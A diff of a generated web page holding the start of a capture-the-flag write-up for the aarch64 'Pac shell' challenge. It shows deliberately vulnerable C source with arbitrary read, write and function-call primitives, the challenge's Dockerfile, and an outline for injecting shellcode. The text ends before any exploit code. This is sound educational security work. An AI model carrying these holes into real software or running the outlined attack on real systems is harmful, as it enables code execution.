@@ -11,6 +11,8 @@
       
       
       
+        <link rel="prev" href="../jmp_flag/">
+      
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -407,6 +409,113 @@
   
 
     
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Pac shell
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Pac shell
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#prologue" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prologue
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#my-struggle" class="md-nav__link">
+    <span class="md-ellipsis">
+      My struggle
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="My struggle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#epilogue" class="md-nav__link">
+    <span class="md-ellipsis">
+      Epilogue
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
   </ul>
 </nav>
                   </div>
@@ -447,6 +556,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="My struggle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -481,7 +614,7 @@
   
 
 
-  <h1>Pac shell writeup</h1>
+  <h1>Pac shell</h1>
 
 <h2 id="prologue">Prologue<a class="headerlink" href="#prologue" title="Permanent link">&para;</a></h2>
 <p>Difficulty: easy</p>
@@ -493,8 +626,164 @@
 </div>
 <p>Input files:</p>
 <details class="info">
-<summary>encoding.txt</summary>
+<summary>pacsh.c</summary>
+<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
+<span class="p">}</span><span class="w"> </span><span class="n">builtin_func</span><span class="p">;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">ls</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;ls&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">read64</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;read64&gt; &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%8lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">write64</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">val</span><span class="p">;</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;write64&gt; &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p %lx&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
+<span class="w">    </span><span class="o">*</span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">val</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">help</span><span class="p">();</span>
+<span class="n">builtin_func</span><span class="w"> </span><span class="n">BUILTINS</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;help&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;ls&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;read64&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;write64&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">write64</span><span class="w"> </span><span class="p">},</span>
+<span class="p">};</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">help</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">f</span><span class="p">)();</span>
+<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BUILTINS</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fptr</span><span class="p">;</span>
+<span class="w">        </span><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;paciza %0</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;=r&quot;</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">f</span><span class="p">));</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%8s: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BUILTINS</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Welcome to pac shell v0.0.1&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">help</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;pacsh&gt; &quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">fptr</span><span class="p">);</span>
+<span class="w">        </span><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;autiza %0</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;=r&quot;</span><span class="p">(</span><span class="n">fptr</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">fptr</span><span class="p">));</span>
+<span class="w">        </span><span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
 </details>
+<details class="info">
+<summary>Dockerfile</summary>
+<div class="language-dockerfile highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">ghcr.io/downunderctf/docker-vendor/nsjail:ubuntu-22.04</span>
+
+<span class="k">ENV</span><span class="w"> </span><span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
+<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>gcc-aarch64-linux-gnu<span class="w"> </span>qemu-user<span class="w"> </span>qemu-user-static<span class="w"> </span>--fix-missing<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-r<span class="w"> </span>/var/lib/apt/lists/*
+
+<span class="k">ENV</span><span class="w"> </span><span class="nv">JAIL_CWD</span><span class="o">=</span>/chal
+
+<span class="k">COPY</span><span class="w"> </span>./flag.txt<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./ld-linux-aarch64.so.1<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./libc.so.6<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./pacsh<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./run.sh<span class="w"> </span>/home/ctf/chal/pwn
+</code></pre></div></td></tr></table></div>
+</details>
+<ul>
+<li><a href="https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/pwn/pac-shell/publish/pac_shell.tar.gz">pac_shell.tar.gz</a> - also includes binary, libc and ld, run.sh</li>
+</ul>
 <p>NB:</p>
 <ul>
 <li>
@@ -511,6 +800,434 @@
 <li>I am using gdb with <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> plugin</li>
 </ul>
 <h2 id="my-struggle">My struggle<a class="headerlink" href="#my-struggle" title="Permanent link">&para;</a></h2>
+<h3 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h3>
+<p>First thing that I like to do is to inspect environment we deal with:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">run.sh</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/bin/sh</span>
+
+qemu-aarch64<span class="w"> </span>pacsh
+</code></pre></div></td></tr></table></div>
+<p>So, the binary is aarch64 and is running under emulation.</p>
+<div class="language-dockerfile highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Dockerfile</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">ghcr.io/downunderctf/docker-vendor/nsjail:ubuntu-22.04</span>
+
+<span class="k">ENV</span><span class="w"> </span><span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
+<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>gcc-aarch64-linux-gnu<span class="w"> </span>qemu-user<span class="w"> </span>qemu-user-static<span class="w"> </span>--fix-missing<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-r<span class="w"> </span>/var/lib/apt/lists/*
+
+<span class="k">ENV</span><span class="w"> </span><span class="nv">JAIL_CWD</span><span class="o">=</span>/chal
+
+<span class="k">COPY</span><span class="w"> </span>./flag.txt<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./ld-linux-aarch64.so.1<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./libc.so.6<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./pacsh<span class="w"> </span>/home/ctf/chal
+<span class="k">COPY</span><span class="w"> </span>./run.sh<span class="w"> </span>/home/ctf/chal/pwn
+</code></pre></div></td></tr></table></div>
+<p>There are 5 files in the container, and entrypoint command (<code>JAL_CWD</code>) is <code>/chal</code>. Flag is in <code>/home/ctf/chal</code>.</p>
+<p>Now its time to focus on the application itself:</p>
+<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
+<span class="p">}</span><span class="w"> </span><span class="n">builtin_func</span><span class="p">;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">ls</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;ls&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">read64</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;read64&gt; &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%8lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">write64</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">val</span><span class="p">;</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;write64&gt; &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p %lx&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
+<span class="w">    </span><span class="o">*</span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">val</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">help</span><span class="p">();</span>
+<span class="n">builtin_func</span><span class="w"> </span><span class="n">BUILTINS</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;help&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;ls&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;read64&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;write64&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">fptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">write64</span><span class="w"> </span><span class="p">},</span>
+<span class="p">};</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">help</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">f</span><span class="p">)();</span>
+<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BUILTINS</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fptr</span><span class="p">;</span>
+<span class="w">        </span><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;paciza %0</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;=r&quot;</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">f</span><span class="p">));</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%8s: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BUILTINS</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Welcome to pac shell v0.0.1&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">help</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;pacsh&gt; &quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">fptr</span><span class="p">);</span>
+<span class="w">        </span><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;autiza %0</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;=r&quot;</span><span class="p">(</span><span class="n">fptr</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">fptr</span><span class="p">));</span>
+<span class="w">        </span><span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p>There are 4 functions: <code>ls</code>, <code>read64</code>, <code>write64</code>, <code>help</code>. Main is a loop that reads address from user and calls function at 
+that address. General ideal here would be:</p>
+<ol>
+<li>Find writeable address;</li>
+<li>Write shellcode to that address using write64;</li>
+<li>Jump to that address from main loop.</li>
+</ol>
+<p>Note that application is using AUTIZA/PACIZA instructions for address authentication.
